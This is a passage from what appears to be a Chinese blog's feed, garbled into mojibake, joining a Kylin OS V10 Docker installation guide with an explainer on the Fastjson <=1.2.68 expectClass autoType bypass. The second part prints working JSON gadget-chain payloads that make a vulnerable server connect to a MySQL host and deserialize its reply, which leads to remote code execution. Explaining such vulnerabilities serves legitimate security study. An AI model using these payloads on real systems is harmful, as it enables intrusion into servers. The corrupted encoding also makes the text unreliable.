çš„é•œåƒæºæ˜¯å› ä¸ºåœ¨å®‰è£…dockerçš„æ—¶å€™éœ€è¦é¢å¤–çš„ä¸€äº›ä¾èµ–ï¼Œè€Œè¿™äº›ä¾èµ–åœ¨éº’éºŸå®˜æ–¹çš„æºé‡Œé¢æ˜¯æ²¡æœ‰çš„ã€‚\ncurl -o /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-8.repo é…ç½®é˜¿é‡Œäº‘ docker é•œåƒæº yum-config-manager --add-repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo sed -i \u0026#39;s+download.docker.com+mirrors.aliyun.com/docker-ce+\u0026#39; /etc/yum.repos.d/docker-ce.repo å®šä¹‰ yum å˜é‡\u0026amp;ä¿®æ”¹ repo ä¿®æ”¹ centos å’Œ docker repoæ–‡ä»¶ä¸­çš„ $releasever ä¸º centos_version ï¼ŒåŸå› æ˜¯åœ¨éº’éºŸæœåŠ¡å™¨æ“ä½œç³»ç»ŸV10ä¸­ $releaseverè¢«ä¿®æ”¹ä¸ºäº† 10ï¼Œè€Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ centos 8çš„é•œåƒæºï¼Œå¦‚æœä½ ä¸æ›¿æ¢ï¼ŒåŸºæœ¬ä¸Šä»“åº“çš„æ¯ä¸€ä¸ªåœ°å€éƒ½æ˜¯404ã€‚\necho \u0026#34;8\u0026#34; \u0026gt; /etc/yum/vars/centos_version sed -i \u0026#39;s/$releasever/$centos_version/g\u0026#39; /etc/yum.repos.d/docker-ce.repo sed -i \u0026#39;s/$releasever/$centos_version/g\u0026#39; /etc/yum.repos.d/CentOS-Base.repo å»ºç«‹yumç¼“å­˜ æ²¡å•¥å¯è¯´çš„\nyum makecache æŸ¥çœ‹docker-ce ç‰ˆæœ¬ yum list docker-ce --showduplicates | sort -r docker-ce.x86_64 3:20.10.9-3.el8 docker-ce-stable docker-ce.x86_64 3:20.10.8-3.el8 docker-ce-stable docker-ce.x86_64 3:20.10.7-3.el8 docker-ce-stable docker-ce.x86_64 3:20.10.6-3.el8 docker-ce-stable docker-ce.x86_64 3:20.10.5-3.el8 docker-ce-stable docker-ce.x86_64 3:20.10.4-3.el8 docker-ce-stable docker-ce.x86_64 3:20.10.3-3.el8 docker-ce-stable docker-ce.x86_64 3:20.10.2-3.el8 docker-ce-stable docker-ce.x86_64 3:20.10.1-3.el8 docker-ce-stable docker-ce.x86_64 3:20.10.12-3.el8 docker-ce-stable docker-ce.x86_64 3:20.10.11-3.el8 docker-ce-stable docker-ce.x86_64 3:20.10.10-3.el8 docker-ce-stable docker-ce.x86_64 3:20.10.0-3.el8 docker-ce-stable docker-ce.x86_64 3:19.03.15-3.el8 docker-ce-stable docker-ce.x86_64 3:19.03.15-3.el8 @docker-ce-stable docker-ce.x86_64 3:19.03.14-3.el8 docker-ce-stable docker-ce.x86_64 3:19.03.13-3.el8 docker-ce-stable å®‰è£…docker è¿™é‡Œè¦å®‰è£… docker-ce 19.03 ç‰ˆæœ¬ï¼Œå› ä¸ºæˆ‘åœ¨ä½¿ç”¨æœ€æ–°ç‰ˆ 20.10 å¯åŠ¨å®¹å™¨æ—¶å‡ºç°äº†æœªçŸ¥çš„æƒé™é—®é¢˜ï¼Œè€Œéº’éºŸæœåŠ¡å™¨æ“ä½œç³»ç»Ÿèµ„æ–™ç›¸å¯¹è¾ƒå°‘ï¼Œæˆ‘æœªèƒ½æ‰¾åˆ°ç›¸åº”çš„è§£å†³æ–¹æ¡ˆï¼Œåªå¥½é€€è€Œæ±‚å…¶æ¬¡ï¼Œæ¢åˆ°ä¸Šä¸€ä¸ªç¨³å®šç‰ˆæœ¬ã€‚\n20.10 ç‰ˆæœ¬é”™è¯¯ä¿¡æ¯å¦‚ä¸‹ï¼š\ndocker: Error response from daemon: OCI runtime create failed: container_linux.go:318: starting container process caused \u0026#34;permission denied\u0026#34;: unknown. ERRO[0000] error waiting for container: context canceled è¿˜æ˜¯å®‰è£… 19.03 ç‰ˆæœ¬å§ã€‚\nyum install docker-ce-19.03.15 docker-ce-cli-19.03.15 containerd.io -y å¯åŠ¨docker systemctl start docker systemctl enable docker å¯åŠ¨ hello-world è¿›è¡Œæµ‹è¯• root@localhost ~]# docker run hello-world Unable to find image \u0026#39;hello-world:latest\u0026#39; locally latest: Pulling from library/hello-world 2db29710123e: Pull complete Digest: sha256:2498fce14358aa50ead0cc6c19990fc6ff866ce72aeb5546e1d59caac3d0d60f Status: Downloaded newer image for hello-world:latest Hello from Docker! This message shows that your installation appears to be working correctly. To generate this message, Docker took the following steps: 1. The Docker client contacted the Docker daemon. 2. The Docker daemon pulled the \u0026#34;hello-world\u0026#34; image from the Docker Hub. (amd64) 3. The Docker daemon created a new container from that image which runs the executable that produces the output you are currently reading. 4. The Docker daemon streamed that output to the Docker client, which sent it to your terminal. To try something more ambitious, you can run an Ubuntu container with: $ docker run -it ubuntu bash Share images, automate workflows, and more with a free Docker ID: https://hub.docker.com/ For more examples and ideas, visit: https://docs.docker.com/get-started/ å®Œç¾ä½¿ç”¨ -:)\n","permalink":"https://www.typesafe.cn/posts/install-docker-on-kylinos/","summary":"\u003cblockquote\u003e\n\u003cp\u003eé“¶æ²³éº’éºŸé«˜çº§æœåŠ¡å™¨æ“ä½œç³»ç»Ÿ V10 æ˜¯é’ˆå¯¹ä¼ä¸šçº§å…³é”®ä¸šåŠ¡ï¼Œé€‚åº”è™šæ‹ŸåŒ–ã€ äº‘è®¡ç®—ã€å¤§æ•°æ®ã€å·¥ä¸šäº’è”ç½‘æ—¶ä»£å¯¹ä¸»æœºç³»ç»Ÿå¯é æ€§ã€å®‰å…¨æ€§ã€æ€§èƒ½ã€æ‰©å±•æ€§å’Œ å®æ—¶æ€§çš„éœ€æ±‚ï¼Œä¾æ® CMMI 5 çº§æ ‡å‡†ç ”åˆ¶çš„æä¾›å†…ç”Ÿå®‰å…¨ã€äº‘åŸç”Ÿæ”¯æŒã€å›½äº§ å¹³å°æ·±å…¥ä¼˜åŒ–ã€é«˜æ€§èƒ½ã€æ˜“ç®¡ç†çš„æ–°ä¸€ä»£è‡ªä¸»æœåŠ¡å™¨æ“ä½œç³»ç»Ÿï¼›åŒæºæ”¯æŒé£è…¾ã€ é¾™èŠ¯ã€ç”³å¨ã€å…†èŠ¯ã€æµ·å…‰ã€é²²é¹ç­‰è‡ªä¸»å¹³å°ï¼›å¯æ”¯æ’‘æ„å»ºå¤§å‹æ•°æ®ä¸­å¿ƒæœåŠ¡å™¨é«˜ å¯ç”¨é›†ç¾¤ã€è´Ÿè½½å‡è¡¡é›†ç¾¤ã€åˆ†å¸ƒå¼é›†ç¾¤æ–‡ä»¶ç³»ç»Ÿã€è™šæ‹ŸåŒ–åº”ç”¨å’Œå®¹å™¨äº‘å¹³å°ç­‰ï¼Œ å¯éƒ¨ç½²åœ¨ç‰©ç†æœåŠ¡å™¨å’Œè™šæ‹ŸåŒ–ç¯å¢ƒã€ç§æœ‰äº‘ã€å…¬æœ‰äº‘å’Œæ··åˆäº‘ç¯å¢ƒï¼›åº”ç”¨äºæ”¿åºœã€ å›½é˜²ã€é‡‘èã€æ•™è‚²ã€è´¢ç¨ã€å…¬å®‰ã€å®¡è®¡ã€äº¤é€šã€åŒ»ç–—ã€åˆ¶é€ ç­‰é¢†åŸŸã€‚\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003eå…¬å¸æœ‰ä¸ªé¡¹ç›®éœ€è¦å°†ç³»ç»Ÿéƒ¨ç½²åœ¨ \u003cstrong\u003ekylinos\u003c/strong\u003eä¸Šï¼Œåˆšå¼€å§‹è¿˜æœ‰ç‚¹å¤´ç–¼ï¼Œå®³æ€•å„ç§ç¨‹åºæ— æ³•å®‰è£…å’Œä½¿ç”¨ï¼Œç­‰å®‰è£…å¥½æœåŠ¡å™¨è¿›è¡Œä½¿ç”¨çš„æ—¶å€™å‘ç°è¿™ä¸å°±æ˜¯åŸºäºcentosçš„å˜›ï¼Œè™½ç„¶åŸºäºå“ªä¸ªç‰ˆæœ¬ä¸çŸ¥é“ï¼Œä½†æ˜¯å¯ä»¥æµ‹è¯•çš„ï¼Œäºæ˜¯æˆ‘ä¸€é¡¿æ“ä½œï¼Œæœ€åå‘ç°å®ƒæ˜¯åŸºäºCentos8çš„ï¼Œç³»ç»Ÿå†…æ ¸ç‰ˆæœ¬æ˜¯ 4.19ï¼Œé—®é¢˜ä¸å¤§ï¼Œæ—¢ç„¶æ˜¯åŸºäºCentos8çš„ï¼Œé‚£Centos8ä¸Šèƒ½è·‘çš„ç¨‹åºï¼Œåœ¨è¿™è‚¯å®šä¹Ÿèƒ½è·‘ï¼Œç„¶åæˆ‘å°±å¼€å§‹äº†æ„‰å¿«ï¼ˆç—›è‹¦ï¼‰çš„å®‰è£…dockerä¹‹æ—…äº†ã€‚\u003c/p\u003e\n\u003ch3 id=\"é…ç½®é˜¿é‡Œäº‘centos8é•œåƒæº\"\u003eé…ç½®é˜¿é‡Œäº‘Centos8é•œåƒæº\u003c/h3\u003e\n\u003cp\u003eä¹‹æ‰€ä»¥è¦é…ç½® Centos8 çš„é•œåƒæºæ˜¯å› ä¸ºåœ¨å®‰è£…dockerçš„æ—¶å€™éœ€è¦é¢å¤–çš„ä¸€äº›ä¾èµ–ï¼Œè€Œè¿™äº›ä¾èµ–åœ¨éº’éºŸå®˜æ–¹çš„æºé‡Œé¢æ˜¯æ²¡æœ‰çš„ã€‚\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecurl -o /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-8.repo\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"é…ç½®é˜¿é‡Œäº‘-docker-é•œåƒæº\"\u003eé…ç½®é˜¿é‡Œäº‘ docker é•œåƒæº\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eyum-config-manager --add-repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esed -i \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;s+download.docker.com+mirrors.aliyun.com/docker-ce+\u0026#39;\u003c/span\u003e /etc/yum.repos.d/docker-ce.repo\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"å®šä¹‰-yum-å˜é‡ä¿®æ”¹-repo\"\u003eå®šä¹‰ yum å˜é‡\u0026amp;ä¿®æ”¹ repo\u003c/h3\u003e\n\u003cp\u003eä¿®æ”¹ centos å’Œ docker \u003ccode\u003erepo\u003c/code\u003eæ–‡ä»¶ä¸­çš„ \u003ccode\u003e$releasever\u003c/code\u003e ä¸º \u003ccode\u003ecentos_version\u003c/code\u003e ï¼ŒåŸå› æ˜¯åœ¨éº’éºŸæœåŠ¡å™¨æ“ä½œç³»ç»ŸV10ä¸­ \u003ccode\u003e$releasever\u003c/code\u003eè¢«ä¿®æ”¹ä¸ºäº† 10ï¼Œè€Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ centos 8çš„é•œåƒæºï¼Œå¦‚æœä½ ä¸æ›¿æ¢ï¼ŒåŸºæœ¬ä¸Šä»“åº“çš„æ¯ä¸€ä¸ªåœ°å€éƒ½æ˜¯404ã€‚\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;8\u0026#34;\u003c/span\u003e \u0026gt; /etc/yum/vars/centos_version\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esed -i \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;s/$releasever/$centos_version/g\u0026#39;\u003c/span\u003e /etc/yum.repos.d/docker-ce.repo\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esed -i \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;s/$releasever/$centos_version/g\u0026#39;\u003c/span\u003e /etc/yum.repos.d/CentOS-Base.repo\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"å»ºç«‹yumç¼“å­˜\"\u003eå»ºç«‹yumç¼“å­˜\u003c/h3\u003e\n\u003cp\u003eæ²¡å•¥å¯è¯´çš„\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eyum makecache\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"æŸ¥çœ‹docker-ce-ç‰ˆæœ¬\"\u003eæŸ¥çœ‹docker-ce ç‰ˆæœ¬\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eyum list docker-ce --showduplicates | sort -r\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker-ce.x86_64               3:20.10.9-3.el8                 docker-ce-stable\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker-ce.x86_64               3:20.10.8-3.el8                 docker-ce-stable\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker-ce.x86_64               3:20.10.7-3.el8                 docker-ce-stable\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker-ce.x86_64               3:20.10.6-3.el8                 docker-ce-stable\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker-ce.x86_64               3:20.10.5-3.el8                 docker-ce-stable\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker-ce.x86_64               3:20.10.4-3.el8                 docker-ce-stable\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker-ce.x86_64               3:20.10.3-3.el8                 docker-ce-stable\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker-ce.x86_64               3:20.10.2-3.el8                 docker-ce-stable\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker-ce.x86_64               3:20.10.1-3.el8                 docker-ce-stable\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker-ce.x86_64               3:20.10.12-3.el8                docker-ce-stable\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker-ce.x86_64               3:20.10.11-3.el8                docker-ce-stable\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker-ce.x86_64               3:20.10.10-3.el8                docker-ce-stable\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker-ce.x86_64               3:20.10.0-3.el8                 docker-ce-stable\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker-ce.x86_64               3:19.03.15-3.el8                docker-ce-stable\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker-ce.x86_64               3:19.03.15-3.el8                @docker-ce-stable\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker-ce.x86_64               3:19.03.14-3.el8                docker-ce-stable\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edocker-ce.x86_64               3:19.03.13-3.el8                docker-ce-stable\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"å®‰è£…docker\"\u003eå®‰è£…docker\u003c/h3\u003e\n\u003cp\u003eè¿™é‡Œè¦å®‰è£… docker-ce 19.03 ç‰ˆæœ¬ï¼Œå› ä¸ºæˆ‘åœ¨ä½¿ç”¨æœ€æ–°ç‰ˆ 20.10 å¯åŠ¨å®¹å™¨æ—¶å‡ºç°äº†æœªçŸ¥çš„æƒé™é—®é¢˜ï¼Œè€Œéº’éºŸæœåŠ¡å™¨æ“ä½œç³»ç»Ÿèµ„æ–™ç›¸å¯¹è¾ƒå°‘ï¼Œæˆ‘æœªèƒ½æ‰¾åˆ°ç›¸åº”çš„è§£å†³æ–¹æ¡ˆï¼Œåªå¥½é€€è€Œæ±‚å…¶æ¬¡ï¼Œæ¢åˆ°ä¸Šä¸€ä¸ªç¨³å®šç‰ˆæœ¬ã€‚\u003c/p\u003e","title":"åœ¨é“¶æ²³éº’éºŸé«˜çº§æœåŠ¡å™¨æ“ä½œç³»ç»ŸV10ä¸Šå®‰è£…docker"},{"content":"å£°æ˜ æœ¬æ–‡ç« ä¸­æ‰€æœ‰å†…å®¹ä»…ä¾›å­¦ä¹ äº¤æµï¼Œä¸¥ç¦ç”¨äºéæ³•ç”¨é€”ï¼Œå¦åˆ™ç”±æ­¤äº§ç”Ÿçš„ä¸€åˆ‡åæœå‡ä¸ä½œè€…æ— å…³ã€‚\nFastjson \u0026lt;= 1.2.68 expectClass ç»•è¿‡åŸç† å½“ fastjson æ›´æ–°åˆ° 1.2.68 ä¹‹åï¼Œå¤§éƒ¨åˆ†å®‰å…¨æ¼æ´éƒ½å·²ç»å°å µä½äº†ï¼Œä½†ä¸æ’é™¤è¿˜æœ‰äººæ‰‹é‡Œæ¡ç€ä¸€äº› 0day æ²¡æœ‰æ”¾å‡ºæ¥ã€‚\nfastjson 1.2.68 åœ¨è¿›è¡Œååºåˆ—åŒ–çš„æ—¶å€™ï¼Œä¼šè¿›å…¥ ObjectDeserializer çš„ deserialze æ–¹æ³•ï¼Œè€Œ å®‰å…¨äººå‘˜å‘ç° å½“ @type ä¸º java.lang.AutoCloseable çš„æ—¶å€™ä¼šæ‰¾åˆ°å®ç°ç±» JavaBeanDeserializer è°ƒç”¨ deserialzeï¼Œè€Œ JavaBeanDeserializer çš„ deserialze æ–¹æ³•è¿˜ä¼šç»§ç»­è§£æå¾—åˆ°ç¬¬äºŒä¸ª @type å¯¹åº”çš„å€¼è¿›è¡Œååºåˆ—åŒ–ï¼Œå¹¶ä¸” expectClass åˆ™ä¸å†æ˜¯ null å€¼ï¼Œè€Œæ˜¯ java.lang.AutoCloseableã€‚\nJavaBeanDeserializer çš„ deserialze éƒ¨åˆ†ä»£ç ç¤ºä¾‹ã€‚\nif (lexer.token() == JSONToken.LITERAL_STRING) { // ç¬¬äºŒä¸ª @type çš„å€¼ String typeName = lexer.stringVal(); lexer.nextToken(JSONToken.COMMA); if (typeName.equals(beanInfo.typeName)|| parser.isEnabled(Feature.IgnoreAutoType)) { if (lexer.token() == JSONToken.RBRACE) { lexer.nextToken(); break; } continue; } // è¿™é‡Œæ²¡æœ‰è·å–åˆ° deserializer ObjectDeserializer deserializer = getSeeAlso(config, this.beanInfo, typeName); Class\u0026lt;?\u0026gt; userType = null; if (deserializer == null) { // ç¬¬ä¸€ä¸ª @type çš„å€¼ Class\u0026lt;?\u0026gt; expectClass = TypeUtils.getClass(type); // åœ¨åŒ…å« expectClass æ—¶ä¼šç»•è¿‡ userType = config.checkAutoType(typeName, expectClass, lexer.getFeatures()); deserializer = parser.getConfig().getDeserializer(userType); } // å†æ¬¡è¿›è¡Œååºåˆ—åŒ–ï¼Œä¼šè§¦å‘åå°„æ„é€ å®ä¾‹ Object typedObject = deserializer.deserialze(parser, userType, fieldName); if (deserializer instanceof JavaBeanDeserializer) { JavaBeanDeserializer javaBeanDeserializer = (JavaBeanDeserializer) deserializer; if (typeKey != null) { FieldDeserializer typeKeyFieldDeser = javaBeanDeserializer.getFieldDeserializer(typeKey); if (typeKeyFieldDeser != null) { typeKeyFieldDeser.setValue(typedObject, typeName); } } } return (T) typedObject; } ParseConfig çš„ checkAutoType éƒ¨åˆ†ä»£ç ç¤ºä¾‹ï¼Œåªè¦ç¬¬äºŒä¸ª @type ç»§æ‰¿äº† ç¬¬ä¸€ä¸ª @type å³å¯è§¦å‘ã€‚\nif (expectClass != null) { if (expectClass.isAssignableFrom(clazz)) { TypeUtils.addMapping(typeName, clazz); return clazz; } else { throw new JSONException(\u0026#34;type not match. \u0026#34; + typeName + \u0026#34; -\u0026gt; \u0026#34; + expectClass.getName()); } } Fastjson \u0026lt;= 1.2.68 åˆ©ç”¨é“¾ åœ¨ black hat usa 2021 è®®é¢˜ä¸Šï¼Œè…¾è®¯ç„æ­¦å®éªŒå®¤æŠ«éœ²äº†å››æ¡åˆ©ç”¨é“¾ï¼Œåˆ†åˆ«æ˜¯ï¼š\nMysql connector RCE Apache commons io read and write files Jetty SSRF Apache xbean-reflect RCE å…¶ä¸­ Mysql çš„åˆ©ç”¨é“¾æ˜¯å› ä¸ºå¯ä»¥æ„é€ ä»»æ„ URL ä½¿ç”¨ JDBC è¿æ¥ï¼Œè¿æ¥è‡³æ¶æ„ Mysql æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨è¿”å›çš„å†…å®¹è¢« JDBC ååºåˆ—åŒ–ã€‚\nMysql connector 5.1.x\n{ \u0026#34;@type\u0026#34;: \u0026#34;java.lang.AutoCloseable\u0026#34;, \u0026#34;@type\u0026#34;: \u0026#34;com.mysql.jdbc.JDBC4Connection\u0026#34;, \u0026#34;hostToConnectTo\u0026#34;: \u0026#34;mysql.host\u0026#34;, \u0026#34;portToConnectTo\u0026#34;: 3306, \u0026#34;info\u0026#34;: { \u0026#34;user\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;pass\u0026#34;, \u0026#34;statementInterceptors\u0026#34;: \u0026#34;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\u0026#34;, \u0026#34;autoDeserialize\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;NUM_HOSTS\u0026#34;: \u0026#34;1\u0026#34; }, \u0026#34;databaseToConnectTo\u0026#34;: \u0026#34;dbname\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;\u0026#34; } â€¢ Mysql connector 6.0.2 or 6.0.3\n{ \u0026#34;@type\u0026#34;: \u0026#34;com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection\u0026#34;, \u0026#34;proxy\u0026#34;: { \u0026#34;connectionString\u0026#34;: { \u0026#34;url\u0026#34;: \u0026#34;jdbc:mysql://localhost:3306/foo?allowLoadLocalInfile=true\u0026#34; } } } â€¢ Mysql connector 6.x or \u0026lt; 8.0.20\n{ \u0026#34;@type\u0026#34;:\u0026#34;com.mysql.cj.jdbc.ha.ReplicationMySQLConnection\u0026#34;, \u0026#34;proxy\u0026#34;:{ \u0026#34;@type\u0026#34;:\u0026#34;com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy\u0026#34;, \u0026#34;connectionUrl\u0026#34;:{ \u0026#34;@type\u0026#34;:\u0026#34;com.mysql.cj.conf.url.ReplicationConnectionUrl\u0026#34;, \u0026#34;masters\u0026#34;:[ { \u0026#34;host\u0026#34;:\u0026#34;mysql.host\u0026#34; } ], \u0026#34;slaves\u0026#34;:[ ], \u0026#34;properties\u0026#34;:{ \u0026#34;host\u0026#34;:\u0026#34;mysql.host\u0026#34;, \u0026#34;user\u0026#34;:\u0026#34;user\u0026#34;, \u0026#34;dbname\u0026#34;:\u0026#34;dbname\u0026#34;, \u0026#34;password\u0026#34;:\u0026#34;pass\u0026#34;, \u0026#34;queryInterceptors\u0026#34;:\u0026#34;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\u0026#34;, \u0026#34;autoDeserialize\u0026#34;:\u0026#34;true\u0026#34; } } } } JDBC åˆ©ç”¨é“¾åŸç† æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€æ®µæ¯ä¸€ä¸ªJava å¼€å‘éƒ½è¦å­¦ä¹ çš„ JDBC æ“ä½œæ•°æ®åº“çš„ç¤ºä¾‹ï¼š\nimport java.sql.*; public class MySQLDemo { static final String JDBC_DRIVER = \u0026#34;com.mysql.jdbc.Driver\u0026#34;; static final String DB_URL = \u0026#34;jdbc:mysql://localhost:3306/test\u0026#34;; static final String USERNAME = \u0026#34;root\u0026#34;; static final String PASSWORD = \u0026#34;123456\u0026#34;; public static void main(String[] args) { Connection conn = null; Statement stmt = null; try { // æ³¨å†Œ JDBC é©±åŠ¨ Class.forName(JDBC_DRIVER); // æ‰“å¼€é“¾æ¥ System.out.println(\u0026#34;è¿æ¥æ•°æ®åº“...\u0026#34;); conn = DriverManager.getConnection(DB_URL, USERNAME, PASSWORD); // æ‰§è¡ŒæŸ¥è¯¢ System.out.println(\u0026#34; å®ä¾‹åŒ–Statementå¯¹è±¡...\u0026#34;); stmt = conn.createStatement(); String sql; sql = \u0026#34;SELECT * FROM test\u0026#34;; ResultSet rs = stmt.executeQuery(sql); int index = 0; // å±•å¼€ç»“æœé›†æ•°æ®åº“ while (rs.next()) { // getObject ä¼šæ ¹æ®å­—æ®µä¸åŒçš„ç±»å‹åšä¸åŒçš„å¤„ç† Object object = rs.getObject(index); System.out.println(object); index++; } // å®Œæˆåå…³é—­ rs.close(); } catch (Exception se) { se.printStackTrace(); } finally { // å…³é—­èµ„æº try { if (stmt != null) stmt.close(); } catch (SQLException ignored) { } try { if (conn != null) conn.close(); } catch (SQLException ignored) { } } System.out.println(\u0026#34;Goodbye!\u0026#34;); } } å…¶ä¸­ ResultSetImpl çš„ getObject æ–¹æ³•ä¼šæ ¹æ®Mysqlä¸­å­—æ®µçš„ç±»å‹åšä¸åŒçš„å¤„ç†ï¼Œæºç å¦‚ä¸‹ï¼š\n@Override public Object getObject(int columnIndex) throws SQLException { checkRowPos(); checkColumnBounds(columnIndex); int columnIndexMinusOne = columnIndex - 1; // we can\u0026#39;t completely rely on code below because primitives have default values for null (e.g. int-\u0026gt;0) if (this.thisRow.getNull(columnIndexMinusOne)) { return null; } Field field = this.columnDefinition.getFields()[columnIndexMinusOne]; switch (field.getMysqlType()) { case BIT: // TODO Field sets binary and blob flags if the length of BIT field is \u0026gt; 1; is it needed at all? if (field.isBinary() || field.isBlob()) { byte[] data = getBytes(columnIndex); if (this.connection.getPropertySet().getBooleanProperty(PropertyKey.autoDeserialize).getValue()) { Object obj = data; if ((data != null) \u0026amp;\u0026amp; (data.length \u0026gt;= 2)) { if ((data[0] == -84) \u0026amp;\u0026amp; (data[1] == -19)) { // Serialized object? try { ByteArrayInputStream bytesIn = new ByteArrayInputStream(data); ObjectInputStream objIn = new ObjectInputStream(bytesIn); obj = objIn.readObject(); objIn.close(); bytesIn.close(); } catch (ClassNotFoundException cnfe) { throw SQLError.createSQLException(Messages.getString(\u0026#34;ResultSet.Class_not_found___91\u0026#34;) + cnfe.toString() + Messages.getString(\u0026#34;ResultSet._while_reading_serialized_object_92\u0026#34;), getExceptionInterceptor()); } catch (IOException ex) { obj = data; // not serialized? } } else { return getString(columnIndex); } } return obj; } return data; } return field.isSingleBit() ? Boolean.valueOf(getBoolean(columnIndex)) : getBytes(columnIndex); // ä»£ç çœç•¥ case BINARY: case VARBINARY: case TINYBLOB: case MEDIUMBLOB: case LONGBLOB: case BLOB: if (field.isBinary() || field.isBlob()) { byte[] data = getBytes(columnIndex); if (this.connection.getPropertySet().getBooleanProperty(PropertyKey.autoDeserialize).getValue()) { Object obj = data; if ((data != null) \u0026amp;\u0026amp; (data.length \u0026gt;= 2)) { if ((data[0] == -84) \u0026amp;\u0026amp; (data[1] == -19)) { // Serialized object? try { ByteArrayInputStream bytesIn = new ByteArrayInputStream(data); ObjectInputStream objIn = new ObjectInputStream(bytesIn); obj = objIn.readObject(); objIn.close(); bytesIn.close(); } catch (ClassNotFoundException cnfe) { throw SQLError.createSQLException(Messages.getString(\u0026#34;ResultSet.Class_not_found___91\u0026#34;) + cnfe.toString() + Messages.getString(\u0026#34;ResultSet._while_reading_serialized_object_92\u0026#34;), getExceptionInterceptor()); } catch (IOException ex) { obj = data; // not serialized? } } else { return getString(columnIndex); } } return obj; } return data; } return getBytes(columnIndex); // ä»£ç çœç•¥ } } 